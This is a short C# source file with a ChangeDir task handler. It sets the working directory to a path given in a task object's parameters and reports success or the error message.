using System;
using System.Diagnostics;
using System.IO;

namespace SaltedCaramel.Tasks
{
    public class ChangeDir
    {
        public static void Execute(SCTask task)
        {
            string path = task.@params;

            try
            {
                Directory.SetCurrentDirectory(path);
                task.status = "complete";
                task.message = $"Changed to directory {task.@params}";
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[!] ChangeDir - ERROR: {e.Message}");
                task.status = "error";
                task.message = e.Message;
            }
        }
    }
}
